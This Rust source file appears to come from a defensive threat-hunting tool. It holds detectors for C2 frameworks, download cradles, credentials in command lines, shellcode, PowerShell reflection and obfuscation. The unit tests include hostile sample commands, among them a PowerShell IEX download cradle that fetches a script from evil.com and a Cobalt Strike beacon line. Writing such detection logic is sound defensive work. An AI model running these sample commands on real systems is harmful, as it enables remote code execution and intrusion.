use crate::hunt::{set_hunt_finding, HuntSeverity};
use crate::model::Event;
use crate::transforms::Transform;
use std::sync::OnceLock;

// ── C2 Framework Indicator ─────────────────────────────────────────

pub struct C2FrameworkIndicator;

impl C2FrameworkIndicator {
    fn regex() -> &'static regex::RegexSet {
        static RE: OnceLock<regex::RegexSet> = OnceLock::new();
        RE.get_or_init(|| {
            regex::RegexSet::new([
                // Cobalt Strike
                r"(?i)\bbeacon\.(exe|dll|bin)\b",
                r"(?i)\\\\\.\\pipe\\(msagent_|MSSE-|postex_|status_|postex_ssh_)",
                r"(?i)\bjump\s+(psexec|winrm|ssh)\b",
                r"(?i)\bspawn(to|as|x64|x86)\b",
                // Metasploit
                r"(?i)(meterpreter|msfvenom|msfconsole|multi/handler)",
                r"(?i)(LHOST\s*=|LPORT\s*=|payload/)",
                // Sliver
                r"(?i)\b(sliver|implant.*generate|mtls\s|wg\s.*listener)\b",
                // Empire / Starkiller
                r"(?i)(invoke-empire|starkiller|launcher.*stager)",
                // Havoc
                r"(?i)\b(havoc.*listener|demon\b.*\bhavoc)\b",
                // Brute Ratel
                r"(?i)(bruteratel|BRc4|badger\.exe)",
                // PoshC2
                r"(?i)(PoshC2|Invoke-Pbind|posh-server)",
                // Covenant
                r"(?i)(grunt(http|smb)|covenant)",
                // Generic C2 pipe pattern
                r"(?i)\\\\\.\\pipe\\[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}",
            ])
            .unwrap()
        })
    }

    fn framework_name(index: usize) -> &'static str {
        match index {
            0..=3 => "CobaltStrike",
            4..=5 => "Metasploit",
            6 => "Sliver",
            7 => "Empire",
            8 => "Havoc",
            9 => "BruteRatel",
            10 => "PoshC2",
            11 => "Covenant",
            12 => "GenericC2Pipe",
            _ => "Unknown",
        }
    }
}

impl Transform for C2FrameworkIndicator {
    fn name(&self) -> &str {
        "c2_framework_indicator"
    }

    fn apply(&self, event: &mut Event) {
        for field_name in &["CommandLine", "ScriptBlockText"] {
            let val = match event.fields.get(*field_name) {
                Some(v) if v.len() > 5 => v.clone(),
                _ => continue,
            };

            let matches: Vec<usize> = Self::regex().matches(&val).iter().collect();
            if !matches.is_empty() {
                let framework = Self::framework_name(matches[0]);
                event
                    .fields
                    .insert("hunt_c2_framework".into(), framework.into());
                set_hunt_finding(
                    &mut event.fields,
                    "C2Framework",
                    HuntSeverity::Critical,
                    &format!("{} C2 framework indicators detected", framework),
                );
                return;
            }
        }
    }
}

// ── Download Cradle Detector ───────────────────────────────────────

const DOWNLOAD_CRADLE_KEYWORDS: &[(&str, &str)] = &[
    ("downloadstring", "Net.WebClient.DownloadString"),
    ("downloadfile", "Net.WebClient.DownloadFile"),
    ("downloaddata", "Net.WebClient.DownloadData"),
    ("invoke-webrequest", "Invoke-WebRequest"),
    ("invoke-restmethod", "Invoke-RestMethod"),
    ("start-bitstransfer", "Start-BitsTransfer"),
    ("net.webclient", "Net.WebClient"),
    ("bitstransfer", "BitsTransfer"),
    ("certutil -urlcache", "certutil-urlcache"),
    ("certutil -decode", "certutil-decode"),
    ("certutil /urlcache", "certutil-urlcache"),
    ("bitsadmin /transfer", "bitsadmin-transfer"),
    ("bitsadmin /addfile", "bitsadmin-addfile"),
    ("wget ", "wget"),
    ("curl ", "curl"),
    ("iex(", "IEX"),
    ("iex (", "IEX"),
    ("invoke-expression", "Invoke-Expression"),
    (".openread(", "WebClient.OpenRead"),
    ("xmlhttp", "XMLHTTP"),
    ("msxml2.xmlhttp", "MSXML2.XMLHTTP"),
    ("winhttprequest", "WinHttpRequest"),
];

pub struct DownloadCradleDetector;

impl Transform for DownloadCradleDetector {
    fn name(&self) -> &str {
        "download_cradle_detector"
    }

    fn apply(&self, event: &mut Event) {
        for field_name in &["CommandLine", "ScriptBlockText"] {
            let val = match event.fields.get(*field_name) {
                Some(v) if v.len() > 5 => v.clone(),
                _ => continue,
            };

            let val_lower = val.to_lowercase();
            let mut found = Vec::new();

            for (keyword, label) in DOWNLOAD_CRADLE_KEYWORDS {
                if val_lower.contains(keyword) {
                    found.push(*label);
                }
            }

            if !found.is_empty() {
                let method = found[0];
                event
                    .fields
                    .insert("hunt_download_cradle".into(), method.into());
                set_hunt_finding(
                    &mut event.fields,
                    "DownloadCradle",
                    HuntSeverity::High,
                    &format!("Download cradle: {}", found.join(", ")),
                );
                return;
            }
        }
    }
}

// ── Credential Extraction ──────────────────────────────────────────

pub struct CredentialExtraction;

impl CredentialExtraction {
    fn regex() -> &'static regex::RegexSet {
        static RE: OnceLock<regex::RegexSet> = OnceLock::new();
        RE.get_or_init(|| {
            regex::RegexSet::new([
                r"(?i)/user:\S+\s+/p(assword)?:\S+",
                r"(?i)/U\s+\S+\s+/P\s+\S+",
                r"(?i)net\s+use\s+\\\\\S+\s+\S+\s+/user:",
                r"(?i)wmic\s+/node:\S+\s+/user:\S+\s+/password:\S+",
                r"(?i)cmdkey\s+/add:",
                r"(?i)schtasks\s+.*(/U\s+\S+|/RU\s+\S+).*(/P\s+\S+|/RP\s+\S+)",
                r"(?i)psexec\s+.*-u\s+\S+\s+-p\s+\S+",
                r"(?i)runas\s+/user:\S+",
            ])
            .unwrap()
        })
    }
}

impl Transform for CredentialExtraction {
    fn name(&self) -> &str {
        "credential_extraction"
    }

    fn apply(&self, event: &mut Event) {
        let cmd = match event.fields.get("CommandLine") {
            Some(v) if v.len() > 10 => v.clone(),
            _ => return,
        };

        let matches: Vec<usize> = Self::regex().matches(&cmd).iter().collect();
        if !matches.is_empty() {
            event
                .fields
                .insert("hunt_cred_exposure".into(), "true".into());
            set_hunt_finding(
                &mut event.fields,
                "CredentialExtraction",
                HuntSeverity::High,
                "Credentials exposed in command line arguments",
            );
        }
    }
}

// ── Shellcode Indicator ────────────────────────────────────────────

const SHELLCODE_KEYWORDS: &[&str] = &[
    "virtualalloc",
    "virtualprotect",
    "kernel32.dll",
    "ntdll.dll",
    "marshal.copy",
    "rtlmovememory",
    "getprocaddress",
    "createthread",
    "createremotethread",
    "ntcreatethreadex",
    "queueuserapc",
    "ntqueueapcthread",
    "allocglobal",
    "allochglobal",
    "[runtime.interopservices.marshal]",
    "0x90,0x90",
    "\\x90\\x90",
    "page_execute",
    "0x40",
];

pub struct ShellcodeIndicator;

impl Transform for ShellcodeIndicator {
    fn name(&self) -> &str {
        "shellcode_indicator"
    }

    fn apply(&self, event: &mut Event) {
        for field_name in &["CommandLine", "ScriptBlockText"] {
            let val = match event.fields.get(*field_name) {
                Some(v) if v.len() > 20 => v.clone(),
                _ => continue,
            };

            let val_lower = val.to_lowercase();
            let mut count = 0u32;
            let mut indicators = Vec::new();

            for keyword in SHELLCODE_KEYWORDS {
                if val_lower.contains(keyword) {
                    count += 1;
                    if indicators.len() < 3 {
                        indicators.push(*keyword);
                    }
                }
            }

            if count >= 2 {
                event
                    .fields
                    .insert("hunt_shellcode_indicators".into(), indicators.join(", "));
                event
                    .fields
                    .insert("hunt_shellcode_count".into(), count.to_string());
                set_hunt_finding(
                    &mut event.fields,
                    "ShellcodeIndicator",
                    HuntSeverity::Critical,
                    &format!(
                        "Shellcode indicators ({}): {}",
                        count,
                        indicators.join(", ")
                    ),
                );
                return;
            }
        }
    }
}

// ── PowerShell Reflection ──────────────────────────────────────────

const REFLECTION_KEYWORDS: &[&str] = &[
    "[reflection.assembly]::load",
    "[system.reflection.assembly]",
    "assembly.load(",
    "gettype(",
    "invokemember(",
    "getmethod(",
    "getfield(",
    "invoke(",
    "add-type -typedefinition",
    "dllimport",
    "[appdomain]::currentdomain",
    "definedynamicassembly",
    "system.runtime.interopservices",
    "marshal]::ptrtostructure",
];

pub struct PowerShellReflection;

impl Transform for PowerShellReflection {
    fn name(&self) -> &str {
        "powershell_reflection"
    }

    fn apply(&self, event: &mut Event) {
        let script = match event.fields.get("ScriptBlockText") {
            Some(v) if v.len() > 20 => v.clone(),
            _ => return,
        };

        let script_lower = script.to_lowercase();
        let mut found = Vec::new();

        for keyword in REFLECTION_KEYWORDS {
            if script_lower.contains(keyword) {
                found.push(*keyword);
            }
        }

        if found.len() >= 2 {
            event
                .fields
                .insert("hunt_ps_reflection".into(), found.join(", "));
            set_hunt_finding(
                &mut event.fields,
                "PowerShellReflection",
                HuntSeverity::High,
                &format!(".NET reflection abuse: {}", found.join(", ")),
            );
        }
    }
}

// ── Command Deobfuscator ───────────────────────────────────────────

pub struct CommandDeobfuscator;

impl CommandDeobfuscator {
    fn concat_regex() -> &'static regex::Regex {
        static RE: OnceLock<regex::Regex> = OnceLock::new();
        RE.get_or_init(|| regex::Regex::new(r#"'([^']*)'\s*\+\s*'([^']*)'"#).unwrap())
    }
}

impl Transform for CommandDeobfuscator {
    fn name(&self) -> &str {
        "command_deobfuscator"
    }

    fn apply(&self, event: &mut Event) {
        let cmd = match event.fields.get("CommandLine") {
            Some(v) if v.len() > 10 => v.clone(),
            _ => return,
        };

        let mut deobfuscated = cmd.clone();
        let mut methods = Vec::new();

        // 1. Remove carets: p^o^w^e^r^s^h^e^l^l → powershell
        if cmd.matches('^').count() >= 3 {
            deobfuscated = deobfuscated.replace('^', "");
            methods.push("CARET");
        }

        // 2. Remove backticks: po`wer`shell → powershell
        if cmd.matches('`').count() >= 2 {
            let re = regex::Regex::new(r"`([a-zA-Z])").unwrap();
            deobfuscated = re.replace_all(&deobfuscated, "$1").to_string();
            methods.push("BACKTICK");
        }

        // 3. Join string concatenation: 'po'+'wer'+'shell'
        if cmd.contains("'+'") || cmd.contains("\" + \"") {
            let mut reconstructed = String::new();
            for cap in Self::concat_regex().captures_iter(&cmd) {
                reconstructed.push_str(&cap[1]);
                reconstructed.push_str(&cap[2]);
            }
            if !reconstructed.is_empty() {
                methods.push("CONCAT");
            }
        }

        // 4. Env var substring: %COMSPEC:~0,1%
        if cmd.contains(":~") && cmd.contains('%') {
            methods.push("ENV_SUBSTR");
        }

        if !methods.is_empty() && deobfuscated != cmd {
            event
                .fields
                .insert("hunt_deobfuscated_cmd".into(), deobfuscated);
            event
                .fields
                .insert("hunt_deobf_methods".into(), methods.join(","));
            // Info severity — enrichment only, not a detection
            set_hunt_finding(
                &mut event.fields,
                "CommandDeobfuscator",
                HuntSeverity::Info,
                &format!("Deobfuscated: {}", methods.join(", ")),
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::SourceFormat;

    fn make_event(fields: &[(&str, &str)]) -> Event {
        let mut event = Event::new("test.log", SourceFormat::JsonLines);
        for (k, v) in fields {
            event.set(*k, *v);
        }
        event
    }

    #[test]
    fn test_c2_cobalt_strike() {
        let mut event = make_event(&[("CommandLine", r"\\.\pipe\msagent_f8 beacon.exe /c inject")]);
        C2FrameworkIndicator.apply(&mut event);
        assert_eq!(event.get("hunt_c2_framework"), Some("CobaltStrike"));
    }

    #[test]
    fn test_download_cradle() {
        let mut event = make_event(&[(
            "CommandLine",
            "powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
        )]);
        DownloadCradleDetector.apply(&mut event);
        assert!(event.get("hunt_download_cradle").is_some());
    }

    #[test]
    fn test_credential_extraction() {
        let mut event = make_event(&[(
            "CommandLine",
            r"net use \\DC01\C$ P@ssw0rd1! /user:DOMAIN\admin",
        )]);
        CredentialExtraction.apply(&mut event);
        assert_eq!(event.get("hunt_cred_exposure"), Some("true"));
    }

    #[test]
    fn test_shellcode_indicators() {
        let mut event = make_event(&[(
            "ScriptBlockText",
            "$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(256); \
             $k32 = kernel32.dll; VirtualAlloc 0x40",
        )]);
        ShellcodeIndicator.apply(&mut event);
        assert!(event.get("hunt_shellcode_count").is_some());
    }

    #[test]
    fn test_deobfuscator_caret() {
        let mut event = make_event(&[("CommandLine", r"p^o^w^e^r^s^h^e^l^l -enc abc")]);
        CommandDeobfuscator.apply(&mut event);
        assert_eq!(
            event.get("hunt_deobfuscated_cmd"),
            Some("powershell -enc abc")
        );
    }
}
